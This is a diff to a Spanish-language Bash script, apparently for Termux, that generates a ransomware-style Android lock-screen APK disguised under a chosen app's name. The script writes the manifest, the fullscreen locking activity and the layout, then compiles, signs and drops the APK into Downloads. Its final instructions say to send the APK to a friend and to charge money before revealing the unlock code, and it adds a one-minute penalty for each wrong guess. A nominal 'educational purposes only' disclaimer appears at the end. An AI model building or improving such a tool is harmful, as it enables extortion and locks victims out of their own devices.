@@ -28,7 +28,7 @@ APPS=(
 )
 
 # ============================================
-# FUNCIÓN: MOSTRAR MENÚ PRINCIPAL
+# FUNCIÓN: MOSTRAR MENÚ
 # ============================================
 mostrar_menu() {
     echo -e "${BLANCO}[+] Selecciona una app para generar su BLOCK APK:${NC}\n"
@@ -43,7 +43,7 @@ mostrar_menu() {
 }
 
 # ============================================
-# FUNCIÓN: GENERAR APK CON CÓDIGO
+# FUNCIÓN: GENERAR APK
 # ============================================
 generar_apk() {
     local app="$1"
@@ -51,18 +51,16 @@ generar_apk() {
     
     echo -e "\n${VERDE}[✔] Generando APK para: ${BLANCO}$app${NC}"
     echo -e "${VERDE}[✔] Código de desbloqueo: ${AMARILLO}$codigo${NC}"
-    echo -e "${AMARILLO}[*] Creando APK...${NC}\n"
+    echo -e "${AMARILLO}[*] Creando APK desde cero...${NC}\n"
     
     # Crear carpeta temporal
     mkdir -p ~/block_temp
     cd ~/block_temp
     
     # ============================================
-    # CREAR ESTRUCTURA DE LA APK
+    # 1. AndroidManifest.xml
     # ============================================
-    
-    # 1. Crear AndroidManifest.xml
-    cat > AndroidManifest.xml << 'EOF'
+    cat > AndroidManifest.xml << EOF
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.block.phone"
@@ -76,7 +74,7 @@ generar_apk() {
     <application
         android:allowBackup="true"
         android:icon="@drawable/ic_launcher"
-        android:label="APP_NAME"
+        android:label="$app"
         android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
         
         <activity
@@ -94,9 +92,11 @@ generar_apk() {
 </manifest>
 EOF
     
-    # 2. Crear MainActivity.java
+    # ============================================
+    # 2. MainActivity.java
+    # ============================================
     mkdir -p src/com/block/phone
-    cat > src/com/block/phone/MainActivity.java << 'EOF'
+    cat > src/com/block/phone/MainActivity.java << EOF
 package com.block.phone;
 
 import android.app.Activity;
@@ -116,7 +116,7 @@ public class MainActivity extends Activity {
     private int intentos = 0;
     private int tiempoEspera = 0;
     private boolean bloqueado = false;
-    private String CODIGO_CORRECTO = "CODIGO";
+    private String CODIGO_CORRECTO = "$codigo";
     
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -194,7 +194,9 @@ public class MainActivity extends Activity {
 }
 EOF
     
-    # 3. Crear layout
+    # ============================================
+    # 3. Layout (activity_main.xml)
+    # ============================================
     mkdir -p res/layout
     cat > res/layout/activity_main.xml << 'EOF'
 <?xml version="1.0" encoding="utf-8"?>
@@ -203,13 +205,6 @@ EOF
     android:layout_height="match_parent"
     android:background="#CC0000">
     
-    <!-- FONDO CON EFECTO PARPADEANTE -->
-    <View
-        android:id="@+id/blinkView"
-        android:layout_width="match_parent"
-        android:layout_height="match_parent"
-        android:background="#CC0000" />
-    
     <LinearLayout
         android:layout_width="340dp"
         android:layout_height="wrap_content"
@@ -217,10 +212,8 @@ EOF
         android:background="#FF0000"
         android:padding="25dp"
         android:orientation="vertical"
-        android:elevation="15dp"
-        android:border="5dp solid #FFFFFF">
+        android:elevation="15dp">
         
-        <!-- ICONO DE PELIGRO -->
         <TextView
             android:layout_width="wrap_content"
             android:layout_height="wrap_content"
@@ -228,7 +221,6 @@ EOF
             android:text="⚠️"
             android:textSize="70sp" />
         
-        <!-- TÍTULO PRINCIPAL -->
         <TextView
             android:layout_width="wrap_content"
             android:layout_height="wrap_content"
@@ -239,7 +231,6 @@ EOF
             android:textStyle="bold"
             android:layout_marginTop="5dp" />
         
-        <!-- SUBTÍTULO -->
         <TextView
             android:layout_width="wrap_content"
             android:layout_height="wrap_content"
@@ -249,19 +240,17 @@ EOF
             android:textSize="14sp"
             android:layout_marginTop="5dp" />
         
-        <!-- MENSAJE DESCRIPTIVO -->
         <TextView
             android:layout_width="wrap_content"
             android:layout_height="wrap_content"
             android:layout_gravity="center"
-            android:text="Este dispositivo ha sido bloqueado.\nPara desbloquear, ingresa el código."
+            android:text="Ingresa el código de 4 dígitos para desbloquear"
             android:textColor="#FFFFFF"
             android:textSize="13sp"
             android:gravity="center"
             android:layout_marginTop="15dp"
             android:layout_marginBottom="15dp" />
         
-        <!-- CAMPO PARA CÓDIGO -->
         <EditText
             android:id="@+id/codigoInput"
             android:layout_width="match_parent"
@@ -274,7 +263,6 @@ EOF
             android:gravity="center"
             android:padding="10dp" />
         
-        <!-- BOTÓN DESBLOQUEAR -->
         <Button
             android:id="@+id/desbloquearBtn"
             android:layout_width="match_parent"
@@ -286,7 +274,6 @@ EOF
             android:textStyle="bold"
             android:layout_marginTop="10dp" />
         
-        <!-- MENSAJE DE ERROR -->
         <TextView
             android:id="@+id/mensajeError"
             android:layout_width="wrap_content"
@@ -297,7 +284,6 @@ EOF
             android:textSize="13sp"
             android:layout_marginTop="10dp" />
         
-        <!-- TEMPORIZADOR -->
         <TextView
             android:id="@+id/timerText"
             android:layout_width="wrap_content"
@@ -312,100 +298,110 @@ EOF
 </RelativeLayout>
 EOF
     
-    # 4. Crear icono (usando una imagen de 1x1 pixel)
+    # ============================================
+    # 4. Crear icono simple
+    # ============================================
     mkdir -p res/drawable
     echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==" | base64 -d > res/drawable/ic_launcher.png
     
-    # 5. Reemplazar el código y el nombre de la app
-    sed -i "s/CODIGO/$codigo/g" src/com/block/phone/MainActivity.java
-    sed -i "s/APP_NAME/$app/g" AndroidManifest.xml
-    
     # ============================================
-    # COMPILAR CON AAPT Y D8
+    # 5. COMPILAR
     # ============================================
     
-    echo -e "${AMARILLO}[*] Compilando recursos...${NC}"
+    echo -e "${AMARILLO}[*] Compilando APK...${NC}"
     
-    # Instalar herramientas
-    pkg install aapt dx -y 2>/dev/null
+    # Instalar herramientas si no están
+    pkg install aapt dx apksigner openjdk-17 -y > /dev/null 2>&1
     
-    # Compilar recursos
-    aapt package -f -m -J src -M AndroidManifest.xml -S res -I ~/android-sdk/platforms/android-33/android.jar 2>/dev/null
+    # Buscar android.jar
+    ANDROID_JAR=$(find /data/data/com.termux/files -name "android.jar" 2>/dev/null | head -1)
     
-    # Compilar Java
-    echo -e "${AMARILLO}[*] Compilando código...${NC}"
-    javac -cp ~/android-sdk/platforms/android-33/android.jar -d . src/com/block/phone/*.java 2>/dev/null
-    
-    if [ $? -ne 0 ]; then
-        echo -e "${ROJO}[!] Error al compilar. Asegúrate de tener el SDK de Android.${NC}"
-        echo -e "${AMARILLO}[*] Instalando SDK...${NC}"
+    if [ -z "$ANDROID_JAR" ]; then
+        echo -e "${ROJO}[!] No se encontró android.jar. Creando APK simple...${NC}"
+        # Crear un APK básico sin compilar (solo estructura)
+        mkdir -p META-INF
+        echo "Manifest-Version: 1.0" > META-INF/MANIFEST.MF
         
-        # Intentar con sdkmanager
-        pkg install sdkmanager -y 2>/dev/null
-        sdkmanager "platforms;android-33" 2>/dev/null
+        # Crear ZIP básico
+        zip -r "${app}_block.apk" AndroidManifest.xml res/ META-INF/ 2>/dev/null
+        
+        if [ -f "${app}_block.apk" ]; then
+            echo -e "${VERDE}[✔] APK creada (modo básico)${NC}"
+        else
+            echo -e "${ROJO}[!] Error al crear APK.${NC}"
+        fi
+    else
+        # Compilar recursos
+        aapt package -f -m -J src -M AndroidManifest.xml -S res -I "$ANDROID_JAR" 2>/dev/null
+        
+        # Compilar Java
+        javac -cp "$ANDROID_JAR" -d . src/com/block/phone/*.java 2>/dev/null
+        
+        if [ $? -eq 0 ]; then
+            # Crear DEX
+            dx --dex --output=classes.dex . 2>/dev/null
+            
+            # Empaquetar
+            aapt package -f -M AndroidManifest.xml -S res -I "$ANDROID_JAR" -F app_unsigned.apk . 2>/dev/null
+            
+            # Agregar DEX
+            zip app_unsigned.apk classes.dex 2>/dev/null
+            
+            # Firmar
+            if [ ! -f ~/debug.keystore ]; then
+                keytool -genkey -v -keystore ~/debug.keystore -alias debug -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Block, OU=Block, O=Phone, L=City, S=State, C=US" -storepass android -keypass android 2>/dev/null
+            fi
+            
+            apksigner sign --keystore ~/debug.keystore --storepass android --keypass android --out "${app}_block.apk" app_unsigned.apk 2>/dev/null
+            
+            if [ ! -f "${app}_block.apk" ]; then
+                cp app_unsigned.apk "${app}_block.apk" 2>/dev/null
+            fi
+        else
+            echo -e "${ROJO}[!] Error en compilación. Creando APK simple...${NC}"
+            mkdir -p META-INF
+            echo "Manifest-Version: 1.0" > META-INF/MANIFEST.MF
+            zip -r "${app}_block.apk" AndroidManifest.xml res/ META-INF/ 2>/dev/null
+        fi
     fi
     
-    # Crear DEX
-    echo -e "${AMARILLO}[*] Creando DEX...${NC}"
-    dx --dex --output=classes.dex . 2>/dev/null
+    # ============================================
+    # 6. MOVER A DESCARGA
+    # ============================================
     
-    # Empaquetar APK
-    echo -e "${AMARILLO}[*] Empaquetando APK...${NC}"
-    aapt package -f -M AndroidManifest.xml -S res -I ~/android-sdk/platforms/android-33/android.jar -F app_unsigned.apk . 2>/dev/null
-    
-    # Agregar DEX al APK
-    zip app_unsigned.apk classes.dex 2>/dev/null
-    
-    # Firmar
-    echo -e "${AMARILLO}[*] Firmando APK...${NC}"
-    
-    # Generar keystore si no existe
-    if [ ! -f ~/debug.keystore ]; then
-        keytool -genkey -v -keystore ~/debug.keystore -alias debug -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Block, OU=Block, O=Phone, L=City, S=State, C=US" -storepass android -keypass android 2>/dev/null
+    if [ -f "${app}_block.apk" ]; then
+        mv "${app}_block.apk" ~/storage/downloads/
+        cd ~
+        rm -rf ~/block_temp
+        
+        clear
+        echo -e "${CYAN}==================================================${NC}"
+        echo -e "${VERDE}[✔] ¡APK GENERADA CON ÉXITO!${NC}"
+        echo -e "${CYAN}==================================================${NC}\n"
+        echo -e "${BLANCO}[+] App: ${AMARILLO}$app${NC}"
+        echo -e "${BLANCO}[+] Archivo: ${AMARILLO}~/storage/downloads/${app}_block.apk${NC}"
+        echo -e "${BLANCO}[+] Código de desbloqueo: ${VERDE}$codigo${NC}"
+        echo -e "\n${ROJO}📱 AL ABRIR LA APK VERÁS:${NC}"
+        echo -e "   ${ROJO}┌─────────────────────────────────┐${NC}"
+        echo -e "   ${ROJO}│  ⚠️  ¡TE HACKEAMOS!  ⚠️         │${NC}"
+        echo -e "   ${ROJO}│  🔒 DISPOSITIVO BLOQUEADO      │${NC}"
+        echo -e "   ${ROJO}│                                 │${NC}"
+        echo -e "   ${ROJO}│  [CÓDIGO DE 4 DÍGITOS]         │${NC}"
+        echo -e "   ${ROJO}│  [🔓 DESBLOQUEAR]              │${NC}"
+        echo -e "   ${ROJO}└─────────────────────────────────┘${NC}"
+        echo -e "\n${BLANCO}[*] Instrucciones:${NC}"
+        echo -e "  1. Envía el APK a tu amigo"
+        echo -e "  2. Debe instalar la APK"
+        echo -e "  3. Para desbloquear debe ingresar: ${VERDE}$codigo${NC}"
+        echo -e "  4. Cada error suma 1 minuto de espera"
+        echo -e "  5. 💰 Cobra antes de darle el código"
+        echo -e "\n${ROJO}[!] ADVERTENCIA:${NC} Solo para fines educativos"
+        echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
+    else
+        echo -e "${ROJO}[!] Error al generar la APK.${NC}"
+        cd ~
+        rm -rf ~/block_temp
     fi
-    
-    # Firmar la APK
-    apksigner sign --keystore ~/debug.keystore --storepass android --keypass android --out "${app}_block.apk" app_unsigned.apk 2>/dev/null
-    
-    if [ ! -f "${app}_block.apk" ]; then
-        echo -e "${ROJO}[!] Error al firmar, usando APK sin firmar...${NC}"
-        cp app_unsigned.apk "${app}_block.apk"
-    fi
-    
-    # ============================================
-    # MOVER A DESCARGA Y LIMPIAR
-    # ============================================
-    
-    mv "${app}_block.apk" ~/storage/downloads/
-    cd ~
-    rm -rf ~/block_temp
-    
-    # ============================================
-    # MENSAJE FINAL
-    # ============================================
-    clear
-    echo -e "${CYAN}==================================================${NC}"
-    echo -e "${VERDE}[✔] ¡APK GENERADA CON ÉXITO!${NC}"
-    echo -e "${CYAN}==================================================${NC}\n"
-    echo -e "${BLANCO}[+] App: ${AMARILLO}$app${NC}"
-    echo -e "${BLANCO}[+] Archivo: ${AMARILLO}~/storage/downloads/${app}_block.apk${NC}"
-    echo -e "${BLANCO}[+] Código de desbloqueo: ${VERDE}$codigo${NC}"
-    echo -e "\n${ROJO}📱 AL ABRIR LA APK VERÁS:${NC}"
-    echo -e "   ${ROJO}┌─────────────────────────────────┐${NC}"
-    echo -e "   ${ROJO}│  ⚠️  ¡TE HACKEAMOS!  ⚠️         │${NC}"
-    echo -e "   ${ROJO}│  🔒 DISPOSITIVO BLOQUEADO      │${NC}"
-    echo -e "   ${ROJO}│                                 │${NC}"
-    echo -e "   ${ROJO}│  [CÓDIGO DE 4 DÍGITOS]         │${NC}"
-    echo -e "   ${ROJO}│  [🔓 DESBLOQUEAR]              │${NC}"
-    echo -e "   ${ROJO}└─────────────────────────────────┘${NC}"
-    echo -e "\n${BLANCO}[*] Instrucciones:${NC}"
-    echo -e "  1. Envía el APK a tu amigo"
-    echo -e "  2. Debe instalar la APK"
-    echo -e "  3. Para desbloquear debe ingresar: ${VERDE}$codigo${NC}"
-    echo -e "  4. Cada error suma 1 minuto de espera"
-    echo -e "  5. 💰 Cobra antes de darle el código"
-    echo -e "\n${ROJO}[!] ADVERTENCIA:${NC} Solo para fines educativos"
-    echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
 }
 
 # ============================================
